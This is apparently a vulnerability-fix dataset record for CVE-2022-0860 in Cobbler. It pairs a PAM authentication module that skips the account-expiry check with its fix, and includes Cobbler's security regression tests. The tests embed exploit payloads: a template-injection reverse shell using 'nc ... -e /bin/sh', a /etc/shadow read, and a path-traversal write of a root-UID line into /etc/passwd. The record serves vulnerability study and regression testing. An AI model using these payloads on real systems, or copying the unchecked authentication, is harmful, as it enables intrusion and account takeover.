{"buggy_code": ["\"\"\"\nAuthentication module that uses /etc/cobbler/auth.conf\nChoice of authentication module is in /etc/cobbler/modules.conf\n\nCopyright 2007-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\nPAM python code based on the pam_python code created by Chris AtLee:\nhttp://atlee.ca/software/pam/\n\n#-----------------------------------------------\npam_python (c) 2007 Chris AtLee <chris@atlee.ca>\nLicensed under the MIT license:\nhttp://www.opensource.org/licenses/mit-license.php\n\nPAM module for python\n\nProvides an authenticate function that will allow the caller to authenticate\na user against the Pluggable Authentication Modules (PAM) on the system.\n\nImplemented using ctypes, so no compilation is necessary.\n\"\"\"\n\nfrom ctypes import CDLL, POINTER, Structure, CFUNCTYPE, cast, pointer, sizeof\nfrom ctypes import c_void_p, c_uint, c_char_p, c_char, c_int\nfrom ctypes.util import find_library\n\nLIBPAM = CDLL(find_library(\"pam\"))\nLIBC = CDLL(find_library(\"c\"))\n\nCALLOC = LIBC.calloc\nCALLOC.restype = c_void_p\nCALLOC.argtypes = [c_uint, c_uint]\n\nSTRDUP = LIBC.strdup\nSTRDUP.argstypes = [c_char_p]\nSTRDUP.restype = POINTER(c_char)        # NOT c_char_p !!!!\n\n# Various constants\nPAM_PROMPT_ECHO_OFF = 1\nPAM_PROMPT_ECHO_ON = 2\nPAM_ERROR_MSG = 3\nPAM_TEXT_INFO = 4\n\n\ndef register() -> str:\n    \"\"\"\n    The mandatory Cobbler module registration hook.\n    \"\"\"\n    return \"authn\"\n\n\nclass PamHandle(Structure):\n    \"\"\"\n    wrapper class for pam_handle_t\n    \"\"\"\n    _fields_ = [(\"handle\", c_void_p)]\n\n    def __init__(self):\n        Structure.__init__(self)\n        self.handle = 0\n\n\nclass PamMessage(Structure):\n    \"\"\"\n    wrapper class for pam_message structure\n    \"\"\"\n    _fields_ = [(\"msg_style\", c_int), (\"msg\", c_char_p)]\n\n    def __repr__(self):\n        return \"<PamMessage %i '%s'>\" % (self.msg_style, self.msg)\n\n\nclass PamResponse(Structure):\n    \"\"\"\n    wrapper class for pam_response structure\n    \"\"\"\n    _fields_ = [(\"resp\", c_char_p), (\"resp_retcode\", c_int)]\n\n    def __repr__(self):\n        return \"<PamResponse %i '%s'>\" % (self.resp_retcode, self.resp)\n\n\nCONV_FUNC = CFUNCTYPE(c_int, c_int, POINTER(POINTER(PamMessage)), POINTER(POINTER(PamResponse)), c_void_p)\n\n\nclass PamConv(Structure):\n    \"\"\"\n    wrapper class for pam_conv structure\n    \"\"\"\n    _fields_ = [(\"conv\", CONV_FUNC), (\"appdata_ptr\", c_void_p)]\n\n\nPAM_START = LIBPAM.pam_start\nPAM_START.restype = c_int\nPAM_START.argtypes = [c_char_p, c_char_p, POINTER(PamConv), POINTER(PamHandle)]\n\nPAM_AUTHENTICATE = LIBPAM.pam_authenticate\nPAM_AUTHENTICATE.restype = c_int\nPAM_AUTHENTICATE.argtypes = [PamHandle, c_int]\n\n\ndef authenticate(api_handle, username: str, password: str) -> bool:\n    \"\"\"\n    Validate PAM authentication, returning whether the authentication was successful or not.\n\n    :param api_handle: Used for resolving the the pam service name and getting the Logger.\n    :param username: The username to log in with.\n    :param password: The password to log in with.\n    :returns: True if the given username and password authenticate for the given service. Otherwise False\n    \"\"\"\n\n    @CONV_FUNC\n    def my_conv(n_messages, messages, p_response, app_data):\n        \"\"\"\n        Simple conversation function that responds to any prompt where the echo is off with the supplied password\n        \"\"\"\n        # Create an array of n_messages response objects\n        addr = CALLOC(n_messages, sizeof(PamResponse))\n        p_response[0] = cast(addr, POINTER(PamResponse))\n        for i in range(n_messages):\n            if messages[i].contents.msg_style == PAM_PROMPT_ECHO_OFF:\n                pw_copy = STRDUP(password.encode())\n                p_response.contents[i].resp = cast(pw_copy, c_char_p)\n                p_response.contents[i].resp_retcode = 0\n        return 0\n\n    try:\n        service = api_handle.settings().authn_pam_service\n    except:\n        service = 'login'\n\n    api_handle.logger.debug(\"authn_pam: PAM service is %s\" % service)\n\n    handle = PamHandle()\n    conv = PamConv(my_conv, 0)\n    retval = PAM_START(service.encode(), username.encode(), pointer(conv), pointer(handle))\n\n    if retval != 0:\n        # TODO: This is not an authentication error, something has gone wrong starting up PAM\n        api_handle.logger.error(\"authn_pam: error initializing PAM library\")\n        return False\n\n    retval = PAM_AUTHENTICATE(handle, 0)\n    return retval == 0\n", "\"\"\"\nThis test module tries to automatically replicate all security incidents we had in the past and checks if they fail.\n\"\"\"\n# SPDX-License-Identifier: GPL-2.0-or-later\nimport base64\nimport os\nimport xmlrpc.client\n\nimport pytest\n\nfrom cobbler.utils import get_shared_secret\n\n\n# ==================== Start tnpconsultants ====================\n\n# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>\n\n\n@pytest.fixture\ndef try_connect():\n    def try_connect(url) -> xmlrpc.client.ServerProxy:\n        xmlrpc_server = xmlrpc.client.ServerProxy(url)\n        return xmlrpc_server\n    return try_connect\n\n\n@pytest.fixture(autouse=True)\ndef setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    shared_secret = get_shared_secret()\n    token = cobbler_api.login(\"\", shared_secret)\n    folder = create_kernel_initrd(fk_kernel, fk_initrd)\n    kernel_path = os.path.join(folder, fk_kernel)\n    initrd_path = os.path.join(folder, fk_kernel)\n    # Create a test Distro\n    distro = cobbler_api.new_distro(token)\n    cobbler_api.modify_distro(distro, \"name\", \"security_test_distro\", token)\n    cobbler_api.modify_distro(distro, \"arch\", \"x86_64\", token)\n    cobbler_api.modify_distro(distro, \"kernel\", str(kernel_path), token)\n    cobbler_api.modify_distro(distro, \"initrd\", str(initrd_path), token)\n    cobbler_api.save_distro(distro, token)\n    # Create a test Profile\n    profile = cobbler_api.new_profile(token)\n    cobbler_api.modify_profile(profile, \"name\", \"security_test_profile\", token)\n    cobbler_api.modify_profile(profile, \"distro\", \"security_test_distro\", token)\n    cobbler_api.save_profile(profile, token)\n\n    yield\n\n    cobbler_api.remove_profile(\"security_test_profile\", token)\n    cobbler_api.remove_distro(\"security_test_distro\", token)\n\n\ndef test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n\n        # Assert this NOT succeeds\n        assert not result.startswith(\"root\")\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_template_injection_1(setup_profile, try_connect):\n    # Arrange\n    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n\n        # Assert this NOT succeeds\n        assert not result_stage_1.startswith(\"__import__\")\n        # We should never get to stage two\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_arbitrary_file_write_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n\n    # Act\n    result = cobbler_api.upload_log_data(\n        \"../../../../../../etc\",\n        \"passwd\",\n        len(exploit),\n        100000,\n        base64.b64encode(exploit)\n    )\n\n    # Assert this NOT succeeds\n    assert result is False\n\n# ==================== END tnpconsultants ====================\n"], "fixing_code": ["\"\"\"\nAuthentication module that uses /etc/cobbler/auth.conf\nChoice of authentication module is in /etc/cobbler/modules.conf\n\nCopyright 2007-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\nPAM python code based on the pam_python code created by Chris AtLee:\nhttp://atlee.ca/software/pam/\n\n#-----------------------------------------------\npam_python (c) 2007 Chris AtLee <chris@atlee.ca>\nLicensed under the MIT license:\nhttp://www.opensource.org/licenses/mit-license.php\n\nPAM module for python\n\nProvides an authenticate function that will allow the caller to authenticate\na user against the Pluggable Authentication Modules (PAM) on the system.\n\nImplemented using ctypes, so no compilation is necessary.\n\"\"\"\n\nfrom ctypes import CDLL, POINTER, Structure, CFUNCTYPE, cast, pointer, sizeof\nfrom ctypes import c_void_p, c_uint, c_char_p, c_char, c_int\nfrom ctypes.util import find_library\n\nLIBPAM = CDLL(find_library(\"pam\"))\nLIBC = CDLL(find_library(\"c\"))\n\nCALLOC = LIBC.calloc\nCALLOC.restype = c_void_p\nCALLOC.argtypes = [c_uint, c_uint]\n\nSTRDUP = LIBC.strdup\nSTRDUP.argstypes = [c_char_p]\nSTRDUP.restype = POINTER(c_char)        # NOT c_char_p !!!!\n\n# Various constants\nPAM_PROMPT_ECHO_OFF = 1\nPAM_PROMPT_ECHO_ON = 2\nPAM_ERROR_MSG = 3\nPAM_TEXT_INFO = 4\n\n\ndef register() -> str:\n    \"\"\"\n    The mandatory Cobbler module registration hook.\n    \"\"\"\n    return \"authn\"\n\n\nclass PamHandle(Structure):\n    \"\"\"\n    wrapper class for pam_handle_t\n    \"\"\"\n    _fields_ = [(\"handle\", c_void_p)]\n\n    def __init__(self):\n        Structure.__init__(self)\n        self.handle = 0\n\n\nclass PamMessage(Structure):\n    \"\"\"\n    wrapper class for pam_message structure\n    \"\"\"\n    _fields_ = [(\"msg_style\", c_int), (\"msg\", c_char_p)]\n\n    def __repr__(self):\n        return \"<PamMessage %i '%s'>\" % (self.msg_style, self.msg)\n\n\nclass PamResponse(Structure):\n    \"\"\"\n    wrapper class for pam_response structure\n    \"\"\"\n    _fields_ = [(\"resp\", c_char_p), (\"resp_retcode\", c_int)]\n\n    def __repr__(self):\n        return \"<PamResponse %i '%s'>\" % (self.resp_retcode, self.resp)\n\n\nCONV_FUNC = CFUNCTYPE(c_int, c_int, POINTER(POINTER(PamMessage)), POINTER(POINTER(PamResponse)), c_void_p)\n\n\nclass PamConv(Structure):\n    \"\"\"\n    wrapper class for pam_conv structure\n    \"\"\"\n    _fields_ = [(\"conv\", CONV_FUNC), (\"appdata_ptr\", c_void_p)]\n\n\nPAM_START = LIBPAM.pam_start\nPAM_START.restype = c_int\nPAM_START.argtypes = [c_char_p, c_char_p, POINTER(PamConv), POINTER(PamHandle)]\n\nPAM_AUTHENTICATE = LIBPAM.pam_authenticate\nPAM_AUTHENTICATE.restype = c_int\nPAM_AUTHENTICATE.argtypes = [PamHandle, c_int]\n\nPAM_ACCT_MGMT = LIBPAM.pam_acct_mgmt\nPAM_ACCT_MGMT.restype = c_int\nPAM_ACCT_MGMT.argtypes = [PamHandle, c_int]\n\n\ndef authenticate(api_handle, username: str, password: str) -> bool:\n    \"\"\"\n    Validate PAM authentication, returning whether the authentication was successful or not.\n\n    :param api_handle: Used for resolving the the pam service name and getting the Logger.\n    :param username: The username to log in with.\n    :param password: The password to log in with.\n    :returns: True if the given username and password authenticate for the given service. Otherwise False\n    \"\"\"\n\n    @CONV_FUNC\n    def my_conv(n_messages, messages, p_response, app_data):\n        \"\"\"\n        Simple conversation function that responds to any prompt where the echo is off with the supplied password\n        \"\"\"\n        # Create an array of n_messages response objects\n        addr = CALLOC(n_messages, sizeof(PamResponse))\n        p_response[0] = cast(addr, POINTER(PamResponse))\n        for i in range(n_messages):\n            if messages[i].contents.msg_style == PAM_PROMPT_ECHO_OFF:\n                pw_copy = STRDUP(password.encode())\n                p_response.contents[i].resp = cast(pw_copy, c_char_p)\n                p_response.contents[i].resp_retcode = 0\n        return 0\n\n    try:\n        service = api_handle.settings().authn_pam_service\n    except:\n        service = 'login'\n\n    api_handle.logger.debug(\"authn_pam: PAM service is %s\" % service)\n\n    handle = PamHandle()\n    conv = PamConv(my_conv, 0)\n    retval = PAM_START(service.encode(), username.encode(), pointer(conv), pointer(handle))\n\n    if retval != 0:\n        # TODO: This is not an authentication error, something has gone wrong starting up PAM\n        api_handle.logger.error(\"authn_pam: error initializing PAM library\")\n        return False\n\n    retval = PAM_AUTHENTICATE(handle, 0)\n\n    if retval == 0:\n        retval = PAM_ACCT_MGMT(handle, 0)\n\n    return retval == 0\n", "\"\"\"\nThis test module tries to automatically replicate all security incidents we had in the past and checks if they fail.\n\"\"\"\n# SPDX-License-Identifier: GPL-2.0-or-later\nimport base64\nimport crypt\nimport logging\nimport os\nimport subprocess\nimport xmlrpc.client\n\nimport pytest\n\nfrom cobbler.api import CobblerAPI\nfrom cobbler.utils import get_shared_secret\nfrom cobbler.modules.authentication import pam\n\n\n# ==================== Start tnpconsultants ====================\n\n# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>\n\n\n@pytest.fixture\ndef try_connect():\n    def try_connect(url) -> xmlrpc.client.ServerProxy:\n        xmlrpc_server = xmlrpc.client.ServerProxy(url)\n        return xmlrpc_server\n    return try_connect\n\n\n@pytest.fixture(autouse=True)\ndef setup_profile(try_connect, create_kernel_initrd, fk_kernel, fk_initrd):\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    shared_secret = get_shared_secret()\n    token = cobbler_api.login(\"\", shared_secret)\n    folder = create_kernel_initrd(fk_kernel, fk_initrd)\n    kernel_path = os.path.join(folder, fk_kernel)\n    initrd_path = os.path.join(folder, fk_kernel)\n    # Create a test Distro\n    distro = cobbler_api.new_distro(token)\n    cobbler_api.modify_distro(distro, \"name\", \"security_test_distro\", token)\n    cobbler_api.modify_distro(distro, \"arch\", \"x86_64\", token)\n    cobbler_api.modify_distro(distro, \"kernel\", str(kernel_path), token)\n    cobbler_api.modify_distro(distro, \"initrd\", str(initrd_path), token)\n    cobbler_api.save_distro(distro, token)\n    # Create a test Profile\n    profile = cobbler_api.new_profile(token)\n    cobbler_api.modify_profile(profile, \"name\", \"security_test_profile\", token)\n    cobbler_api.modify_profile(profile, \"distro\", \"security_test_distro\", token)\n    cobbler_api.save_profile(profile, token)\n\n    yield\n\n    cobbler_api.remove_profile(\"security_test_profile\", token)\n    cobbler_api.remove_distro(\"security_test_distro\", token)\n\n\ndef test_arbitrary_file_disclosure_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        result = cobbler_api.generate_script(target, \"\", \"/etc/shadow\")\n\n        # Assert this NOT succeeds\n        assert not result.startswith(\"root\")\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_template_injection_1(setup_profile, try_connect):\n    # Arrange\n    exploitcode = '__import__(\\'os\\').system(\\'nc [tnpitsecurity] 4242 -e /bin/sh\\')'\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n\n    # Act\n    profiles = cobbler_api.get_profiles()\n    target = profiles[0][\"name\"]\n    try:\n        print(\"[+] Stage 1 : Poisoning log with Cheetah template RCE\")\n        result_stage_1 = cobbler_api.generate_script(target, \"\", '{<%= ' + exploitcode + ' %>}')\n        print(\"[+] Stage 2 : Rendering template using an arbitrary file read.\")\n        result_stage_2 = cobbler_api.generate_script(target, \"\", \"/var/log/cobbler/cobbler.log\")\n\n        # Assert this NOT succeeds\n        assert not result_stage_1.startswith(\"__import__\")\n        # We should never get to stage two\n    except xmlrpc.client.Fault as e:\n        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit\n        # before something happened.\n        assert \"ValueError\" in e.faultString\n\n\ndef test_arbitrary_file_write_1(setup_profile, try_connect):\n    # Arrange\n    cobbler_api = try_connect(\"http://localhost/cobbler_api\")\n    exploit = b\"cha:!:0:0:cha:/:/bin/bash\\n\"\n\n    # Act\n    result = cobbler_api.upload_log_data(\n        \"../../../../../../etc\",\n        \"passwd\",\n        len(exploit),\n        100000,\n        base64.b64encode(exploit)\n    )\n\n    # Assert this NOT succeeds\n    assert result is False\n\n# ==================== END tnpconsultants ====================\n\n# ==================== START ysf ====================\n\n# SPDX-FileCopyrightText: 2022 ysf <nicolas.chatelain@tnpconsultants.com>\n\n\ndef test_pam_login_with_expired_user():\n    # Arrange\n    test_api = CobblerAPI()\n    test_username = \"expired_user\"\n    test_password = \"password\"\n    # create pam testuser\n    subprocess.run([\"useradd\", \"-p\", crypt.crypt(test_password), test_username])\n    # change user to be expired\n    subprocess.run([\"chage\", \"-E0\", test_username])\n\n    # Act - Try login\n    result = pam.authenticate(test_api, test_username, test_password)\n\n    # Assert - Login failed\n    assert not result\n\n# ==================== END ysf ====================\n"], "filenames": ["cobbler/modules/authentication/pam.py", "tests/special_cases/security_test.py"], "buggy_code_start_loc": [116, 5], "buggy_code_end_loc": [159, 112], "fixing_code_start_loc": [117, 6], "fixing_code_end_loc": [168, 141], "type": "CWE-285", "message": "Improper Authorization in GitHub repository cobbler/cobbler prior to 3.3.2.", "other": {"cve": {"id": "CVE-2022-0860", "sourceIdentifier": "security@huntr.dev", "published": "2022-03-11T13:15:07.937", "lastModified": "2022-05-23T22:05:41.110", "vulnStatus": "Analyzed", "descriptions": [{"lang": "en", "value": "Improper Authorization in GitHub repository cobbler/cobbler prior to 3.3.2."}, {"lang": "es", "value": "Una Autorizaci\u00f3n Inapropiada en el repositorio GitHub cobbler/cobbler versiones anteriores a 3.3.2"}], "metrics": {"cvssMetricV31": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "3.1", "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "attackVector": "NETWORK", "attackComplexity": "LOW", "privilegesRequired": "NONE", "userInteraction": "NONE", "scope": "UNCHANGED", "confidentialityImpact": "HIGH", "integrityImpact": "HIGH", "availabilityImpact": "NONE", "baseScore": 9.1, "baseSeverity": "CRITICAL"}, "exploitabilityScore": 3.9, "impactScore": 5.2}], "cvssMetricV30": [{"source": "security@huntr.dev", "type": "Secondary", "cvssData": {"version": "3.0", "vectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", "attackVector": "NETWORK", "attackComplexity": "LOW", "privilegesRequired": "NONE", "userInteraction": "NONE", "scope": "UNCHANGED", "confidentialityImpact": "HIGH", "integrityImpact": "LOW", "availabilityImpact": "NONE", "baseScore": 8.2, "baseSeverity": "HIGH"}, "exploitabilityScore": 3.9, "impactScore": 4.2}], "cvssMetricV2": [{"source": "nvd@nist.gov", "type": "Primary", "cvssData": {"version": "2.0", "vectorString": "AV:N/AC:L/Au:N/C:P/I:P/A:N", "accessVector": "NETWORK", "accessComplexity": "LOW", "authentication": "NONE", "confidentialityImpact": "PARTIAL", "integrityImpact": "PARTIAL", "availabilityImpact": "NONE", "baseScore": 6.4}, "baseSeverity": "MEDIUM", "exploitabilityScore": 10.0, "impactScore": 4.9, "acInsufInfo": false, "obtainAllPrivilege": false, "obtainUserPrivilege": false, "obtainOtherPrivilege": false, "userInteractionRequired": false}]}, "weaknesses": [{"source": "security@huntr.dev", "type": "Primary", "description": [{"lang": "en", "value": "CWE-285"}]}, {"source": "nvd@nist.gov", "type": "Secondary", "description": [{"lang": "en", "value": "CWE-863"}]}], "configurations": [{"nodes": [{"operator": "OR", "negate": false, "cpeMatch": [{"vulnerable": true, "criteria": "cpe:2.3:a:cobbler_project:cobbler:*:*:*:*:*:*:*:*", "versionEndExcluding": "3.3.2", "matchCriteriaId": "17C04986-BDCA-44A7-8FF7-52E8A5BABFC9"}]}]}, {"nodes": [{"operator": "OR", "negate": false, "cpeMatch": [{"vulnerable": true, "criteria": "cpe:2.3:o:fedoraproject:fedora:34:*:*:*:*:*:*:*", "matchCriteriaId": "A930E247-0B43-43CB-98FF-6CE7B8189835"}, {"vulnerable": true, "criteria": "cpe:2.3:o:fedoraproject:fedora:35:*:*:*:*:*:*:*", "matchCriteriaId": "80E516C0-98A4-4ADE-B69F-66A772E2BAAA"}, {"vulnerable": true, "criteria": "cpe:2.3:o:fedoraproject:fedora:36:*:*:*:*:*:*:*", "matchCriteriaId": "5C675112-476C-4D7C-BCB9-A2FB2D0BC9FD"}]}]}], "references": [{"url": "https://github.com/cobbler/cobbler/commit/9044aa990a94752fa5bd5a24051adde099280bfa", "source": "security@huntr.dev", "tags": ["Patch", "Third Party Advisory"]}, {"url": "https://huntr.dev/bounties/c458b868-63df-414e-af10-47e3745caa1d", "source": "security@huntr.dev", "tags": ["Exploit", "Issue Tracking", "Patch", "Third Party Advisory"]}, {"url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/D4KCNZYBQC2FM5SEEDRQZO4LRZ4ZECMG/", "source": "security@huntr.dev", "tags": ["Third Party Advisory"]}, {"url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DYWYHWVVRUSPCV5SWBOSAMQJQLTSBTKY/", "source": "security@huntr.dev", "tags": ["Mailing List", "Third Party Advisory"]}, {"url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IYSHMF6MEIITFAG7EJ3IQKVUN7MDV2XM/", "source": "security@huntr.dev", "tags": ["Third Party Advisory"]}]}, "github_commit_url": "https://github.com/cobbler/cobbler/commit/9044aa990a94752fa5bd5a24051adde099280bfa"}}